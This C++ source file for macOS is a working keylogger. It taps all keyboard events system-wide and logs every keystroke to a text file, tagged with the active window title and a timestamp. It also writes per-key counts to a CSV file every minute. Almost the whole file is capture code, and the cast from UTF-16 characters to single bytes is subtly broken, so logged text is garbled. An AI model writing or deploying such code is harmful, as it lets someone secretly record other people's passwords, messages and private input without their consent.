#include <iostream>
#include <fstream>
#include <map>
#include <ApplicationServices/ApplicationServices.h>
#include <ctime>
#include <string>
#include <Carbon/Carbon.h> // Add this include for keycode constants

using namespace std;

string prevWindow = "";
string currWindow = "";
map<string, int> keyCount;

string getActiveWindowTitle()
{
    CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID);
    CFDictionaryRef windowInfo;
    string title = "Unknown";

    for (int i = 0; i < CFArrayGetCount(windowList); i++)
    {
        windowInfo = (CFDictionaryRef)CFArrayGetValueAtIndex(windowList, i);
        CFStringRef windowName = (CFStringRef)CFDictionaryGetValue(windowInfo, kCGWindowName);
        if (windowName)
        {
            char buffer[256];
            CFStringGetCString(windowName, buffer, sizeof(buffer), kCFStringEncodingUTF8);
            title = string(buffer);
            break;
        }
    }
    CFRelease(windowList);
    return title;
}

void logger(CGEventRef event, ofstream &logfile)
{
    currWindow = getActiveWindowTitle();

    if (currWindow != prevWindow)
    {
        time_t current_time = time(NULL);
        char *dt = ctime(&current_time);
        logfile << "\n\n"
                << currWindow << "\t\t" << dt;
        prevWindow = currWindow;
    }

    CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    string keyStr;

    switch (keycode)
    {
    case kVK_Shift:
        keyStr = "[SHIFT]";
        break;
    case kVK_Return:
        keyStr = "[RETURN]";
        break;
    case kVK_Delete:
        keyStr = "[DELETE]";
        break;
    case kVK_Escape:
        keyStr = "[ESCAPE]";
        break;
    case kVK_Control:
        keyStr = "[CTRL]";
        break;
    case kVK_CapsLock:
        keyStr = "[CAPS_LOCK]";
        break;
    case kVK_Option:
        keyStr = "[ALT]";
        break;
    case kVK_Command:
        keyStr = "[CMD]";
        break;
    case kVK_Tab:
        keyStr = "[TAB]";
        break;
    case kVK_Space:
        keyStr = "[SPACE]";
        break;
    case kVK_LeftArrow:
        keyStr = "[LEFT_ARROW]";
        break;
    case kVK_RightArrow:
        keyStr = "[RIGHT_ARROW]";
        break;
    case kVK_UpArrow:
        keyStr = "[UP_ARROW]";
        break;
    case kVK_DownArrow:
        keyStr = "[DOWN_ARROW]";
        break;
    default:
    {
        UniChar unicodeString[4];
        UniCharCount actualStringLength;
        CGEventKeyboardGetUnicodeString(event, 4, &actualStringLength, unicodeString);
        if (actualStringLength > 0)
        {
            keyStr = string((char *)unicodeString, actualStringLength);
        }
    }
    break;
    }

    if (!keyStr.empty())
    {
        keyCount[keyStr]++;
        logfile << keyStr;
    }

    logfile.flush();
}

ofstream logfile;

CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon)
{
    ofstream *logfile = (ofstream *)refcon;
    if (type == kCGEventKeyDown)
    {
        logger(event, *logfile);
    }
    return event;
}

void writeKeyCountsToCSV(const map<string, int> &keyCount)
{
    ofstream csvfile("key_counts.csv");
    if (!csvfile.is_open())
    {
        cerr << "Unable to open CSV file" << endl;
        return;
    }

    csvfile << "Key,Count\n";
    for (const auto &entry : keyCount)
    {
        csvfile << entry.first << "," << entry.second << "\n";
    }

    csvfile.close();
}

void updateCSVFile(CFRunLoopTimerRef timer, void *info)
{
    map<string, int> *keyCount = (map<string, int> *)info;
    writeKeyCountsToCSV(*keyCount);
}

int main()
{
    // Define the event mask to capture key down events
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

    logfile.open("log.txt", ios::out | ios::app);
    if (!logfile.is_open())
    {
        cerr << "Unable to open log file" << endl;
        return 1;
    }

    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault, eventMask, CGEventCallback, &logfile);
    if (!eventTap)
    {
        cerr << "Unable to create event tap" << endl;
        return 1;
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    // Setup a timer to periodically update the CSV file (every minute in this case)
    CFRunLoopTimerContext timerContext = {0, &keyCount, NULL, NULL, NULL};
    CFRunLoopTimerRef timer = CFRunLoopTimerCreate(kCFAllocatorDefault,
                                                   CFAbsoluteTimeGetCurrent() + 60.0,
                                                   60.0,
                                                   0,
                                                   0,
                                                   (CFRunLoopTimerCallBack)updateCSVFile,
                                                   &timerContext);
    CFRunLoopAddTimer(CFRunLoopGetCurrent(), timer, kCFRunLoopCommonModes);

    CFRunLoopRun();

    writeKeyCountsToCSV(keyCount);

    logfile.close();
    return 0;
}
